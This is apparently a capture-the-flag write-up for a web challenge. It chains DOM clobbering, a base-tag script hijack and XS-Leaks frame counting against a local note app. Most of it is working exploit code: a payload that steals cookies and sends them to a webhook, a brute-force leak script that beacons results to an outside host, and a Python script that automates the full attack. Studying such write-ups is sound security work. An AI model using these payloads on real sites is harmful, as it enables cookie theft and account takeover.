# The Leaky Eye Luca

> Dom Cloberring, XSS via base path overwrite, XS Leaks via Frame Counting

## Dom Cloberring

Looking at usuarioNoteDetail.html
```js
try{
    if(window.isClean.isSafe.isSanitized) {
        successScript.src = "./js/success.js";
        successScript.onload = () => report();
    }
}catch{
    successScript.src = "/js/success.js";
    successScript.onload = () => report();
}
```

we can clobber isClean, isSafe, and isSanitized using DOM clobberring technique:
```html
<iframe name=isClean srcdoc="<a id=isSafe name=isSafe><a id=isSafe name=isSanitized href=controlled>"></iframe>
```

## XSS
The reason to clobber those variable is because we want to make the success script importing using **./js/success.js**. which is importing script in via relative path, if we can overwrite this, then we can import the script from anywhere, we can use **<base>** tag to do this:

```html
<base href='https://webhook/'>
```

serve any js file with report function, we can use it to leak cookies:
```js
function report(){
    navigator.sendBeacon("https://webhook", `cookies=${document.cookie}`)
}
```

combine the payload, we can utilize it to privesc to secretaria by looking it's cookie

## XS Leaks using Frame Counting Attack
Take a look at preseidenteNote.html and checkSecretariaNote function in noteController.js
we can see this part:

preseidenteNote.html
```html
<div class="container">
        <div class="header">
            Presidente Note
        </div>
        <div class="content">
            <h1>Content from: {{ email }}</h1>
            <p>{{ content }}</p>
        </div>
        <div class="footer">
            &copy; 2025 Presidente Note. All rights reserved.
        </div>
        {% if "No Content Available" in content %}
            <div class="iframe-container">
                <!-- since you don't know the existing note, just give up and take a look at luca profiles -->
                <iframe src="https://villains.fandom.com/wiki/Leaky-Eye_Luca" frameborder="0"></iframe>
            </div>
        {% endif %}
    </div>
```
This html script will include an iframe if the content starts with "No Content Available".

checkSecretariaNote & getPresidenteNote & checkSecretariaNote route
```js
const checkSecretariaNote = async(req, res) => {
    const title = req.query.title || "";
    try{
        const user = await User.getByRole("ELPresidente");
        const note = await Note.getPresidenteNote(title, user.uuid);
        if (!note) {
            return res.status(200).render("presidenteNote",{email: "Nobody@mail.com", content: "No Content Available"});
        }
            return res.status(200).render("presidenteNote",{email: user.email, content: note.content});
    }catch(err){
        console.log(err);
        return res.status(500).json({message: "error"});
    }

}

Note.getPresidenteNote = async function (title, ownerUUID){
    try{
        const Note = await this.findOne({
            where: {
                title:{
                    [Op.startsWith]: title
                },
                owner: ownerUUID
            },
        });
        return Note
    }catch(err){
        throw err;
    }
}

router.get("/presidente/note", authMiddleware,  presidenteMiddleware,noteController.checkSecretariaNote);
```
Long short story, these 2 scripts will fetch the presidente note by user supplied "title" data in request query, it uses startsWith to filter the note.

as addition, if we look at the bot cookies settings:
```js
        await page.setCookie({
			name: 'passion_ticket',
			value: cookie,
			domain: new URL(APP_URL).hostname,
            httpOnly: (role === "Secretaria" ? false : true),
            sameSite: 'strict'
		});
```

the cookie use httpOnly flag for ELPresidente cookie which disallow attacker to exfiltrate the cookiee using document.cookie. So it's impossible to take the cookie and fetch the /presidente/note directly. Since the flag placed in the title, we can extract the title using [XS Leaks frame counting](https://xsleaks.dev/docs/attacks/frame-counting/) technique. If the frame length is 1, then the title is false, vice versa. Below is the index.html can be used to extract data:

```html
<script>
var webhook="https://qdiyqxfhpgectiqifhius4f88b183wnvt.oast.fun/";
var remote="http://noteapp:6969/presidente/note/?title=";
function log(stat, res){
    navigator.sendBeacon(webhook,`${stat}=${res}`);
}

function exploit(payload){
    return new Promise((resolve, reject) => {
        let win = window.open(remote+payload);
        setTimeout(() => {
            var len = win.length
            win.close()
            resolve(len)
        }, 50);
    })
}
(async() => {
    log("start", "true")
    let length = 1
    while(true){
        var ilen = await exploit("_".repeat(length));
        if(ilen == 1){
            log("flagLength", length);
            break;
        }
        else{
            length+=1;
        }
    }
    let chars = "-abcdefghijklmnopqrstuvwxyz1234567890"
    let flag = ""
    while(flag.length < length-1){
        for (const ch of chars){
            var ilen = await exploit(flag + ch + "_".repeat(length - flag.length - 2));
            if (ilen == 0){
                flag += ch;
                log("tempflag", flag)
                break;
            }
        }
    }
    log("flag",flag)
})()

</script>
```

and this is the automation script using python:
```py
import httpx
import re
import bs4

c = httpx.Client()
def register(user):
    r = c.post("http://localhost:6969/api/register", json={"email": user['email'], "password": user['password']})
    print(r.text)

def login(user):
    r = c.post("http://localhost:6969/api/login", json={"email": user['email'], "password": user['password']})
    cookie = r.headers['Set-Cookie']
    c.headers.update({"Cookie": cookie})
    print("[+] Got Cookie:", cookie)

def send_cloberring_payload(payload):
    r = c.post("http://localhost:6969/api/usuario/note", json={"title": payload['title'], "content": payload['content']})
    print(r.text)

def attack_secretaria():
    print("[+] Make Dom Cloberrring Note")
    r1 = c.get("http://localhost:6969/usuario/notes")
    soup = bs4.BeautifulSoup(r1.text, 'html.parser')
    links = soup.find_all("a", href=True)
    uuid_pattern = re.compile(r'/getnote/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', re.IGNORECASE)
    uuids = [match.group(1) for link in links if (match := uuid_pattern.search(link['href']))]
    print("[+] Found UUIDs:", uuids)
    r2 = c.get(f"http://localhost:6969/bot/visit/secretaria?note="+uuids[0])
    print(r2.text)
    secretaria_cookie = input("[+] Enter Secretaria Cookie (check your webhook): ")
    c.headers.update({"Cookie": "passion_ticket="+secretaria_cookie})
    print("[+] Got Secretaria Cookie:", secretaria_cookie)

def attack_XSLeak(url):
    print("[+] Attack presidente note using XSleaks")
    r = c.get("http://localhost:6969/bot/visit/presidente?url="+url)
    print(r.text)

user = {
    "email":"gendra@ara6.com",
    "password":"ashura"
}

payload = {
    "title":"<iframe name=isClean srcdoc=\"<a id=isSafe name=isSafe><a id=isSafe name=isSanitized href=controlled>\"></iframe><base href='https://webhook.site/60d05d93-724e-457d-8293-19696b837128/'>",
    "content":"aaaaaa"
}

xsleaks_payload_url = "http://webhook.site/99384707-000f-48aa-b0c1-f416f3a1becc"
register(user)
login(user)
send_cloberring_payload(payload)
attack_secretaria()
# exploit xsleaks frame counting, host the auto.html in a server, and change the url to your server :D
attack_XSLeak(xsleaks_payload_url)
```